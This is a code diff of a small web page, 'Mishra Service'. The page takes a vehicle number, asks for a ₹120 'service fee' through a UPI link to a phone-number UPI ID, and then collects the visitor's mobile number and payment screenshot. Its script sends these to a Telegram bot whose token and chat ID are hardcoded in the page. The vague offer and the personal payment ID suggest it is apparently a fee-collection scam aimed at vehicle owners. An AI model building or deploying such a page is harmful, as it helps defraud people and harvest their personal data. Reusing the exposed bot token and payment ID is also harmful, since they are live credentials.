@@ -13,10 +13,11 @@ min-height:100vh;
 background:linear-gradient(-45deg,#4facfe,#00f2fe,#43e97b,#38f9d7);
 background-size:400% 400%;
 animation:gradientMove 10s ease infinite;
-padding-top:70px;
+padding-top:80px;
 display:flex;
 flex-direction:column;
 align-items:center;
+perspective:1200px;
 }
 
 @keyframes gradientMove{
@@ -36,7 +37,7 @@ display:flex;
 justify-content:space-between;
 align-items:center;
 padding:0 15px;
-box-shadow:0 3px 15px rgba(0,0,0,0.15);
+box-shadow:0 8px 25px rgba(0,0,0,0.2);
 z-index:1000;
 }
 
@@ -45,51 +46,36 @@ background:#1d2b64;
 color:white;
 border:none;
 padding:8px 14px;
-border-radius:8px;
-font-size:14px;
-cursor:pointer;
-box-shadow:0 4px 10px rgba(0,0,0,0.2);
-}
-
-.menuBox{
-position:fixed;
-top:60px;
-right:10px;
-background:white;
-width:220px;
 border-radius:12px;
-box-shadow:0 5px 20px rgba(0,0,0,0.2);
-display:none;
-padding:15px;
-z-index:1000;
+cursor:pointer;
+box-shadow:0 6px 0 #0f183d;
 }
 
-.menuBox button{
-width:100%;
-margin-top:10px;
-padding:10px;
-border:none;
-background:#f1f1f1;
-border-radius:8px;
-cursor:pointer;
+.topbar button:active{
+transform:translateY(4px);
+box-shadow:0 2px 0 #0f183d;
 }
 
 .card{
 width:95%;
 max-width:420px;
 background:white;
-margin-top:20px;
-padding:25px;
-border-radius:20px;
-box-shadow:0 10px 30px rgba(0,0,0,0.2);
+padding:30px;
+border-radius:25px;
 text-align:center;
+transition:transform 0.4s ease;
+box-shadow:0 30px 60px rgba(0,0,0,0.3);
+}
+
+.card:hover{
+transform:rotateX(6deg) rotateY(-6deg);
 }
 
 input,button{
 width:100%;
 padding:14px;
-margin-top:12px;
-border-radius:10px;
+margin-top:14px;
+border-radius:14px;
 border:1px solid #ddd;
 font-size:15px;
 }
@@ -99,34 +85,48 @@ background:#1d2b64;
 color:white;
 border:none;
 cursor:pointer;
-box-shadow:0 6px 15px rgba(0,0,0,0.2);
+box-shadow:0 6px 0 #0f183d;
 }
 
-/* RGB Neon Button */
+.mainBtn:active{
+transform:translateY(4px);
+box-shadow:0 2px 0 #0f183d;
+}
+
 .neonBtn{
-background:#111;
+background:#000;
 color:#fff;
-border:none;
 font-weight:bold;
+border:none;
 cursor:pointer;
-animation:rgbGlow 2s linear infinite;
+box-shadow:0 8px 0 #111;
+animation:neonPulse 1.5s infinite alternate;
 }
 
-@keyframes rgbGlow{
-0%{box-shadow:0 0 10px red,0 0 20px red,0 0 40px red;}
-25%{box-shadow:0 0 10px yellow,0 0 20px yellow,0 0 40px yellow;}
-50%{box-shadow:0 0 10px lime,0 0 20px lime,0 0 40px lime;}
-75%{box-shadow:0 0 10px cyan,0 0 20px cyan,0 0 40px cyan;}
-100%{box-shadow:0 0 10px red,0 0 20px red,0 0 40px red;}
+.neonBtn:active{
+transform:translateY(5px);
+box-shadow:0 3px 0 #111;
 }
 
-img{
-width:200px;
-margin:15px auto;
-display:block;
+@keyframes neonPulse{
+from{box-shadow:0 8px 0 #111,0 0 20px #00f2fe;}
+to{box-shadow:0 8px 0 #111,0 0 35px #43e97b;}
 }
 
 .hidden{display:none;}
+
+.footer{
+margin-top:40px;
+color:white;
+font-size:14px;
+}
+
+.footer a{
+color:white;
+cursor:pointer;
+margin:0 5px;
+text-decoration:underline;
+}
 
 .loader{
 position:fixed;
@@ -138,35 +138,8 @@ background:rgba(0,0,0,0.85);
 display:none;
 align-items:center;
 justify-content:center;
-flex-direction:column;
 color:white;
 z-index:2000;
-}
-
-.spinner{
-width:50px;
-height:50px;
-border:5px solid #fff;
-border-top:5px solid #00ffd5;
-border-radius:50%;
-animation:spin 1s linear infinite;
-margin-bottom:15px;
-}
-
-@keyframes spin{to{transform:rotate(360deg);}}
-
-.footer{
-margin-top:30px;
-text-align:center;
-font-size:13px;
-color:white;
-padding:15px;
-}
-
-.footer a{
-color:white;
-text-decoration:underline;
-margin:0 5px;
 }
 </style>
 </head>
@@ -174,56 +147,54 @@ margin:0 5px;
 <body>
 
 <div class="topbar">
-<button onclick="goHome()">🏠 Home</button>
-<button onclick="toggleMenu()">☰</button>
+<button onclick="goHome()">Home</button>
+<button onclick="showAbout()">About</button>
 </div>
 
-<div class="menuBox" id="menuBox">
-<button onclick="openInsurance()">Insurance</button>
-</div>
-
-<div class="loader" id="loader">
-<div class="spinner"></div>
-<div>Processing...</div>
-</div>
+<div class="loader" id="loader">Processing...</div>
 
 <div class="card">
 
-<div id="p1">
+<div id="homePage">
 <h3>Enter Vehicle Number</h3>
-<input id="vehicle" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatVehicle(this)">
+<input id="vehicle" placeholder="BR-09-AB-1234">
 <button class="mainBtn" onclick="goPay()">Continue</button>
 </div>
 
-<div id="p2" class="hidden">
+<div id="payPage" class="hidden">
 <h3>Service Fee ₹120</h3>
 
-<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR" alt="UPI QR Code">
-
-<button class="neonBtn" onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
-Pay with UPI
+<button class="neonBtn"
+onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
+⚡ Pay with UPI
 </button>
-
-<p>UPI: bestinsurance@upi</p>
 
 <input id="mobile" placeholder="Mobile Number">
 <input type="file" id="proof">
 
 <button class="mainBtn" onclick="submitForm()">Submit</button>
+<button class="mainBtn" onclick="goHome()">Back</button>
 </div>
 
-<div id="p3" class="hidden">
-<h3>🎉 Congratulations!</h3>
-<p>हम जल्द ही आपसे संपर्क करेंगे।</p>
-<button class="mainBtn" onclick="goHome()">Home</button>
+<div id="aboutPage" class="hidden">
+<h3>About</h3>
+<p>We provide vehicle assistance and insurance related services.</p>
+<button class="mainBtn" onclick="goHome()">Back</button>
+</div>
+
+<div id="disclaimerPage" class="hidden">
+<h3>Disclaimer</h3>
+<p>This is a private assistance platform.  
+We are not affiliated with any government authority.</p>
+<button class="mainBtn" onclick="goHome()">Back</button>
 </div>
 
 </div>
 
 <div class="footer">
-© 2026 Mishra Service <br>
-<a href="#">About</a> |
-<a href="#">Disclaimer</a>
+© 2026 Mishra Service |
+<a onclick="showAbout()">About</a> |
+<a onclick="showDisclaimer()">Disclaimer</a>
 </div>
 
 <script>
@@ -231,68 +202,69 @@ Pay with UPI
 const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
 const chatId="5600045707";
 
-function toggleMenu(){
-let box=document.getElementById("menuBox");
-box.style.display=box.style.display==="block"?"none":"block";
-}
-
-function openInsurance(){
-window.location.href="https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1";
-}
-
 function goHome(){
-p1.classList.remove("hidden");
-p2.classList.add("hidden");
-p3.classList.add("hidden");
+homePage.classList.remove("hidden");
+payPage.classList.add("hidden");
+aboutPage.classList.add("hidden");
+disclaimerPage.classList.add("hidden");
 vehicle.value="";
 mobile.value="";
 proof.value="";
 }
 
+function showAbout(){
+homePage.classList.add("hidden");
+payPage.classList.add("hidden");
+aboutPage.classList.remove("hidden");
+disclaimerPage.classList.add("hidden");
+}
+
+function showDisclaimer(){
+homePage.classList.add("hidden");
+payPage.classList.add("hidden");
+aboutPage.classList.add("hidden");
+disclaimerPage.classList.remove("hidden");
+}
+
 function goPay(){
-if(!vehicle.value.trim()){alert("Enter vehicle number");return;}
-p1.classList.add("hidden");
-p2.classList.remove("hidden");
+if(!vehicle.value.trim()){
+alert("Enter vehicle number");
+return;
+}
+homePage.classList.add("hidden");
+payPage.classList.remove("hidden");
 }
 
 function submitForm(){
-if(mobile.value.length<10){alert("Enter valid mobile");return;}
-if(!proof.files[0]){alert("Upload screenshot");return;}
+if(mobile.value.length<10){
+alert("Enter valid mobile");
+return;
+}
+if(!proof.files[0]){
+alert("Upload screenshot");
+return;
+}
 
 document.getElementById("loader").style.display="flex";
 
 let data=new FormData();
 data.append("chat_id",chatId);
-data.append("caption",`Vehicle: ${vehicle.value}\nMobile: ${mobile.value}`);
+data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
 data.append("photo",proof.files[0]);
 
-fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{
+fetch("https://api.telegram.org/bot"+token+"/sendPhoto",{
 method:"POST",
 body:data
 })
 .then(()=>{
 document.getElementById("loader").style.display="none";
-p2.classList.add("hidden");
-p3.classList.remove("hidden");
-setTimeout(()=>{goHome();},7000);
+alert("Submitted Successfully");
+goHome();
 })
 .catch(()=>{
 document.getElementById("loader").style.display="none";
-alert("Submission failed");
+alert("Submission Failed");
 });
-}
-
-function formatVehicle(el){
-let v=el.value.toUpperCase().replace(/[^A-Z0-9]/g,"");
-let p1=v.slice(0,2);
-let p2=v.slice(2,4);
-let p3=v.slice(4,6);
-let p4=v.slice(6,10);
-let out=p1;
-if(p2) out+="-"+p2;
-if(p3) out+="-"+p3;
-if(p4) out+="-"+p4;
-el.value=out;
 }
 
 </script>
